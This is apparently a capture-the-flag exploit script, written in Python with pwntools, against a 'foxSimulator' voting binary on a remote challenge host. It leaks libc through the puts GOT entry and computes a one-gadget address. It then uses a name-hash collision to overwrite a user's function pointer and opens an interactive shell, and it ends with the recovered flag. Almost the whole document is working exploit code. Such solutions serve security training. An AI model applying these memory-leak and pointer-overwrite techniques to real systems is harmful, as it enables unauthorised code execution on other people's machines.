#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True
if DEBUG:
    start = 0x4007d1
    putsgot = 0x6016c0
    putsOffset = 0x6b990
    voteAddr = 0x400960
    magicOffset = 0x000d6e77
else:
    start = 0x400821
    putsgot = 0x602020
    putsOffset = 0x6f690
    voteAddr = 0x4009E0
    magicOffset = 0x000f0567

###

if DEBUG:
    r = process("./foxSimulator")
else:
    r = remote("fox.pwn.republican", 9000)

def create_user(user):
    global r

    r.recvuntil("name: ")
    r.sendline(user)
    r.recvuntil("for: ")
    r.sendline(user)
    r.recvuntil("? ")
    r.sendline("1")
    r.recvuntil("[Press")
    r.sendline()


def leak_addr(addr):
    global r

    r.recvuntil("name: ")
    r.sendline("laxa")
    r.recvuntil("for: ")
    r.sendline("laxa")
    r.recvuntil("? ")
    r.sendline(str(addr))
    ret = r.recvline().rstrip()
    ret = ret.ljust(8, "\x00")
    r.recvuntil("[Press")
    r.sendline()
    return u64(ret)


def vote(p, c, addr = 1):
    global r

    r.recvuntil("name: ")
    r.sendline(p)
    r.recvuntil("for: ")
    r.sendline(c)
    r.recvuntil("? ")
    r.sendline(str(addr))
    r.recvuntil("[Press")
    r.sendline()


def leak():
    global r
    global start

    r.recvuntil("name: ")
    r.sendline("laxa")
    r.recvuntil("for: ")
    r.sendline("laxa")
    r.recvuntil("? ")
    r.sendline(str(start))
    ret = r.recvuntil("[Press")
    r.sendline()
    return ret[:-7]


# this code was used to find main address in remote binary
#while True:
#    log.info("testing: %x" % start)
#    ret = leak()
#    start += 0x1
#    if "Nice try" not in ret:
#        log.info("Found main at " + hex(start - 1))
#        break

# leaking binary to get missing functions
#with open("leak", "rb") as f:
#    l = len(f.read())
#start += l
#data = ""
#start = 0x00601000
#while True:
#    try:
#        log.info("start: %x" % start)
#        ret = leak()
#        if len(ret) == 0:
#            data += "\x00"
#            start += 1
#            continue
#        start += len(ret)
#        data += ret
#    except:
#        print "Caught exception"
#        with open("leak", "ab") as f:
#            f.write(data)
#        exit()

#r.close()

leak = leak_addr(putsgot)
libcBase = leak - putsOffset
magic = magicOffset + libcBase
log.info("leak: %x" % leak)
log.info("libcBase: %x" % libcBase)
log.info("magic: %x" % magic)

#gdb.attach(r, "b *doVote")
#log.info("press key")
#raw_input()
#leak = leak_addr(magic)
#log.info("leak: %x" % leak)
#r.close()

create_user("laxa")
create_user("toto")

# now we will rewrite Person->action of "toto"
# "abasers" is hash collision for "Jeb!"
addr = magicOffset + libcBase - voteAddr + 1
vote("abasers", "laxa", addr)

# trigger the action of "toto"
r.recvuntil("name: ")
r.sendline("laxa")
r.recvuntil("for: ")
r.sendline("toto")
r.recvuntil("? ")
r.sendline("0")

r.interactive()
r.close()

# flag is: flag{R3sr1ct_y0ur_s3lf_T0_s0uRce_0nly_4nD_y0u_w1ll_l3ak_a_l0t}
